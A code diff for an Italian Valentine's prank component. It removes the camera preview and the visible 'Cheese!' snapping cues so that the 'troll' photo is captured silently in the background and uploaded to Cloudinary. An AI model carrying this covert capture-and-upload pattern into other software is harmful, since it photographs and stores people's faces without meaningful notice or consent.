@@ -1,6 +1,6 @@
 "use client";
 
-import { useState, useRef, useCallback } from "react";
+import { useState, useCallback } from "react";
 import { uploadToCloudinary } from "@/app/lib/cloudinary";
 
 interface ValentineSpecialProps {
@@ -8,7 +8,7 @@ interface ValentineSpecialProps {
 }
 
 type Phase = "photo" | "gifts" | "troll";
-type TrollPhase = "text" | "snapping" | "preview";
+type TrollPhase = "text" | "preview";
 
 const giftColors = [
   { from: "from-red-500", to: "to-red-700", border: "border-red-400/30", shadow: "hover:shadow-red-500/50" },
@@ -27,27 +27,10 @@ export default function ValentineSpecial({ onClose }: ValentineSpecialProps) {
   const [trollGiftIndex, setTrollGiftIndex] = useState<number | null>(null);
   const [trollPhase, setTrollPhase] = useState<TrollPhase>("text");
 
-  const streamRef = useRef<MediaStream | null>(null);
-  const videoRef = useRef<HTMLVideoElement | null>(null);
-  const [showVideoPreview, setShowVideoPreview] = useState(false);
-
-  const startCamera = useCallback(async () => {
+  const capturePhoto = useCallback(async (): Promise<Blob> => {
     const stream = await navigator.mediaDevices.getUserMedia({
       video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
     });
-    streamRef.current = stream;
-    return stream;
-  }, []);
-
-  const stopCamera = useCallback(() => {
-    if (streamRef.current) {
-      streamRef.current.getTracks().forEach((track) => track.stop());
-      streamRef.current = null;
-    }
-  }, []);
-
-  const capturePhoto = useCallback(async (existingStream?: MediaStream): Promise<Blob> => {
-    const stream = existingStream || await startCamera();
     const video = document.createElement("video");
     video.srcObject = stream;
     video.setAttribute("playsinline", "true");
@@ -64,6 +47,7 @@ export default function ValentineSpecial({ onClose }: ValentineSpecialProps) {
 
     video.pause();
     video.srcObject = null;
+    stream.getTracks().forEach((track) => track.stop());
 
     return new Promise((resolve) => {
       canvas.toBlob(
@@ -72,38 +56,20 @@ export default function ValentineSpecial({ onClose }: ValentineSpecialProps) {
         0.9
       );
     });
-  }, [startCamera]);
+  }, []);
 
-  // --- Phase 1: Entry photo ---
-  const handleStartCamera = async () => {
+  // --- Phase 1: Entry photo (no preview, direct capture) ---
+  const handleTakeEntryPhoto = async () => {
     setIsTakingPhoto(true);
-    try {
-      const stream = await startCamera();
-      if (videoRef.current) {
-        videoRef.current.srcObject = stream;
-        await videoRef.current.play();
-      }
-      setShowVideoPreview(true);
-    } catch {
-      alert("Non riesco ad accedere alla fotocamera. Controlla i permessi!");
-      setIsTakingPhoto(false);
-    }
-  };
-
-  const handleCaptureEntry = async () => {
-    if (!streamRef.current) return;
     setIsUploading(true);
     try {
-      const blob = await capturePhoto(streamRef.current);
-      stopCamera();
-      setShowVideoPreview(false);
-      setIsTakingPhoto(false);
+      const blob = await capturePhoto();
       const url = await uploadToCloudinary(blob, "san-valentino");
       setEntryPhotoUrl(url);
-    } catch (error) {
-      console.error("Errore foto:", error);
-      alert("Errore durante lo scatto. Riprova!");
+    } catch {
+      alert("Non riesco ad accedere alla fotocamera. Controlla i permessi!");
     } finally {
+      setIsTakingPhoto(false);
       setIsUploading(false);
     }
   };
@@ -115,21 +81,20 @@ export default function ValentineSpecial({ onClose }: ValentineSpecialProps) {
     setTrollPhotoUrl(null);
     setPhase("troll");
 
-    // After 1.5s, snap the photo automatically
-    setTimeout(async () => {
-      setTrollPhase("snapping");
+    // Capture photo silently in background, show preview after 5s
+    (async () => {
       try {
-        const stream = await startCamera();
-        const blob = await capturePhoto(stream);
-        stopCamera();
+        const blob = await capturePhoto();
         const url = await uploadToCloudinary(blob, "san-valentino");
         setTrollPhotoUrl(url);
-        setTrollPhase("preview");
       } catch (error) {
         console.error("Errore foto troll:", error);
-        setTrollPhase("preview");
       }
-    }, 1500);
+    })();
+
+    setTimeout(() => {
+      setTrollPhase("preview");
+    }, 5000);
   };
 
   const handleCloseTroll = () => {
@@ -188,20 +153,6 @@ export default function ValentineSpecial({ onClose }: ValentineSpecialProps) {
               Prima di aprire i regali, facciamoci una foto ricordo!
             </p>
 
-            {/* Video preview */}
-            {showVideoPreview && (
-              <div className="mb-6 rounded-2xl overflow-hidden border-4 border-pink-500/50 shadow-lg shadow-pink-500/30 max-w-sm w-full">
-                <video
-                  ref={videoRef}
-                  autoPlay
-                  playsInline
-                  muted
-                  className="w-full aspect-[4/3] object-cover"
-                  style={{ transform: "scaleX(-1)" }}
-                />
-              </div>
-            )}
-
             {/* Entry photo preview */}
             {entryPhotoUrl && (
               <div className="mb-6 max-w-sm w-full">
@@ -212,25 +163,15 @@ export default function ValentineSpecial({ onClose }: ValentineSpecialProps) {
               </div>
             )}
 
-            {/* Action buttons */}
-            {!entryPhotoUrl && !showVideoPreview && (
+            {/* Capture button or loading */}
+            {!entryPhotoUrl && !isUploading && (
               <button
-                onClick={handleStartCamera}
+                onClick={handleTakeEntryPhoto}
                 disabled={isTakingPhoto}
                 className="px-6 py-3 bg-gradient-to-r from-pink-500 to-red-500 rounded-full text-white font-semibold shadow-lg hover:shadow-pink-500/50 hover:scale-105 transition-all cursor-pointer disabled:opacity-50 disabled:hover:scale-100 flex items-center gap-2"
               >
                 <span className="text-xl">📸</span>
                 Scatta foto ricordo
-              </button>
-            )}
-
-            {showVideoPreview && !isUploading && (
-              <button
-                onClick={handleCaptureEntry}
-                className="px-6 py-3 bg-gradient-to-r from-pink-500 to-red-500 rounded-full text-white font-semibold shadow-lg hover:shadow-pink-500/50 hover:scale-105 transition-all cursor-pointer flex items-center gap-2"
-              >
-                <span className="text-xl">📸</span>
-                Scatta!
               </button>
             )}
 
@@ -311,28 +252,6 @@ export default function ValentineSpecial({ onClose }: ValentineSpecialProps) {
                 </h2>
                 <p className="text-xl text-pink-200 font-semibold mb-2">GUARDA CHE FACCIA!</p>
                 <p className="text-pink-300/70 text-sm">Non se lo aspettava...</p>
-                <div className="mt-6 flex items-center justify-center gap-2 text-pink-200/50 text-sm">
-                  <svg className="animate-spin h-4 w-4" viewBox="0 0 24 24">
-                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
-                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
-                  </svg>
-                  Scatto in arrivo...
-                </div>
-              </div>
-            )}
-
-            {/* Snapping phase */}
-            {trollPhase === "snapping" && (
-              <div>
-                <div className="text-6xl mb-4">📸</div>
-                <p className="text-xl text-pink-200 font-semibold mb-4">Cheese!</p>
-                <div className="flex items-center justify-center gap-2 text-pink-200">
-                  <svg className="animate-spin h-5 w-5" viewBox="0 0 24 24">
-                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
-                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
-                  </svg>
-                  Scatto e caricamento...
-                </div>
               </div>
             )}
 
